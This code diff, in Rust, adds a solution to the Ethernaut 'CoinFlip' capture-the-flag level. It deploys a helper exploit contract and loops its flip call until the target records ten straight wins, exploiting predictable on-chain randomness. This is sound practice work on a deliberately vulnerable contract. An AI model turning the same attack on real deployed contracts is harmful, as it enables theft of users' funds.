@@ -1,3 +1,4 @@
+use crate::abi::coin_flip_exploit::CoinFlipExploit;
 use async_trait::async_trait;
 use ctf::ethernaut::lvl03_coin_flip::*;
 
@@ -21,6 +22,19 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        println!("Deploying the exploit contract...");
+        let exploit =
+            CoinFlipExploit::deploy(offender.to_owned(), target.address)?
+                .send()
+                .await?;
+
+        let coin_flip = CoinFlip::new(target.address, offender.to_owned());
+
+        while coin_flip.consecutive_wins().await? < 10.into() {
+            println!("Flipping dat coin boiiiiiiiii");
+            exploit.flip().send().await?.await?;
+        }
+
         Ok(())
     }
 }
